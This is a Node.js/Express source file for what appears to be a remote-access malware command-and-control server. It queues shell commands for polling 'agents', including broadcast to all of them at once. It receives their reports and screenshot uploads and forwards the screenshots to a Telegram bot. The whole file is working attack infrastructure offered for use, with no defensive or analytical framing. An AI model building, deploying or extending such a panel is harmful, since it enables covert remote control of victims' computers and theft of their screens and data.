const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const fs = require('fs');
const multer = require('multer');
const https = require('https');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// --- [ CONFIGURATION ] ---
const CONFIG_PATH = path.join(__dirname, 'config.json');
let config = { TG_BOT_TOKEN: "", TG_CHAT_ID: "", PORT: 80, POLL_INTERVAL: 1 };

if (fs.existsSync(CONFIG_PATH)) {
    config = JSON.parse(fs.readFileSync(CONFIG_PATH));
}

const SCREENSHOT_DIR = path.join(__dirname, 'public', 'screenshots');
if (!fs.existsSync(SCREENSHOT_DIR)) fs.mkdirSync(SCREENSHOT_DIR, { recursive: true });

// --- [ MIDDLEWARE ] ---
app.set('view engine', 'ejs');
app.use(express.static('public'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Multer for screenshots
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, SCREENSHOT_DIR),
    filename: (req, file, cb) => cb(null, `screen_${Date.now()}.png`)
});
const upload = multer({ storage });

let lastAction = "No activity";
let onlineAgents = new Map(); // Map<agentId, { lastSeen, hostname, queue: [] }>

// --- [ TELEGRAM ] ---
function sendToTelegram(text, photoPath = null) {
    if (!config.TG_BOT_TOKEN || config.TG_BOT_TOKEN.length < 10) return;

    if (photoPath) {
        // Send Photo
        const boundary = '----Boundary';
        const filename = path.basename(photoPath);
        const options = {
            hostname: 'api.telegram.org',
            port: 443,
            path: `/bot${config.TG_BOT_TOKEN}/sendPhoto`,
            method: 'POST',
            headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` }
        };

        const req = https.request(options, (res) => {
            let body = '';
            res.on('data', d => body += d);
            res.on('end', () => {
                if (res.statusCode !== 200) console.error(`[Telegram Error] Status: ${res.statusCode}, Body: ${body}`);
            });
        });
        req.on('error', e => console.error(`[Telegram Request Error] ${e.message}`));
        req.write(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${config.TG_CHAT_ID}\r\n`);
        req.write(`--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="${filename}"\r\nContent-Type: image/png\r\n\r\n`);
        req.write(fs.readFileSync(photoPath));
        req.write(`\r\n--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${text}\r\n`);
        req.write(`--${boundary}--\r\n`);
        req.end();
    } else {
        // Send Message
        const data = JSON.stringify({ chat_id: config.TG_CHAT_ID, text: text, parse_mode: "Markdown" });
        const options = {
            hostname: 'api.telegram.org',
            port: 443,
            path: `/bot${config.TG_BOT_TOKEN}/sendMessage`,
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
        };
        const req = https.request(options, (res) => {
            let body = '';
            res.on('data', d => body += d);
            res.on('end', () => {
                if (res.statusCode !== 200) console.error(`[Telegram Error] Status: ${res.statusCode}, Body: ${body}`);
            });
        });
        req.on('error', e => console.error(`[Telegram Request Error] ${e.message}`));
        req.write(data);
        req.end();
    }
}

// --- [ ROUTES ] ---
app.get('/', (req, res) => {
    res.render('index', {
        lastAction,
        agentCount: onlineAgents.size,
        screenshots: fs.readdirSync(SCREENSHOT_DIR).sort().reverse().slice(0, 10),
        config // Pass config to UI
    });
});

app.get('/settings', (req, res) => {
    res.render('settings', { config });
});

app.post('/api/settings', (req, res) => {
    config = { ...config, ...req.body };
    fs.writeFileSync(CONFIG_PATH, JSON.stringify(config, null, 4));
    console.log(`\n[⚙️] Configuration updated via Web UI`);
    res.json({ status: 'Success' });
});

// Agent communication
app.get('/api/poll', (req, res) => {
    const agentId = req.query.id || 'unknown';
    const hostname = req.query.hostname || 'PC';

    if (!onlineAgents.has(agentId)) {
        onlineAgents.set(agentId, {
            id: agentId,
            hostname: hostname,
            lastSeen: Date.now(),
            queue: [],
            isOnline: true
        });
    }

    const agent = onlineAgents.get(agentId);
    agent.lastSeen = Date.now();
    agent.isOnline = true;

    const cmd = agent.queue.shift() || "IDLE";
    res.json({ command: cmd });
});

// Periodic offline checker (every 10s)
setInterval(() => {
    const now = Date.now();
    onlineAgents.forEach(agent => {
        if (now - agent.lastSeen > 15000) {
            agent.isOnline = false;
        }
    });
    io.emit('agent_updates', Array.from(onlineAgents.values()));
}, 10000);

app.post('/api/report', (req, res) => {
    const { id, type, content } = req.body;
    lastAction = `${type}: ${content.substring(0, 50)}...`;

    io.emit('new_report', { id, type, content, time: new Date().toLocaleTimeString() });
    console.log(`[${type}] from ${id}: ${content}`);
    res.send('ACK');
});

app.post('/api/screenshot', upload.single('screenshot'), (req, res) => {
    const filename = req.file.filename;
    const filePath = req.file.path;
    io.emit('new_screenshot', { url: `/screenshots/${filename}`, time: new Date().toLocaleTimeString() });
    sendToTelegram("📸 *Новый скриншот получен!*", filePath);
    res.send('UPLOADED');
});

// Shell control
app.post('/api/cmd', (req, res) => {
    const { cmd, targetId } = req.body;

    if (targetId === "ALL") {
        onlineAgents.forEach(agent => agent.queue.push(cmd));
        return res.json({ status: 'Queued for ALL' });
    }

    if (onlineAgents.has(targetId)) {
        onlineAgents.get(targetId).queue.push(cmd);
        res.json({ status: 'Queued', cmd });
    } else {
        res.status(404).json({ error: 'Agent not found' });
    }
});

// --- [ SOCKETS ] ---
io.on('connection', (socket) => {
    console.log('Admin connected to dashboard');
});

server.listen(config.PORT, () => {
    console.log(`\n🚀 PREMIUM SERVER RUNNING AT http://localhost:${config.PORT}`);
    console.log(`\n[!] Goto http://localhost:${config.PORT}/settings to configure Telegram.`);
});
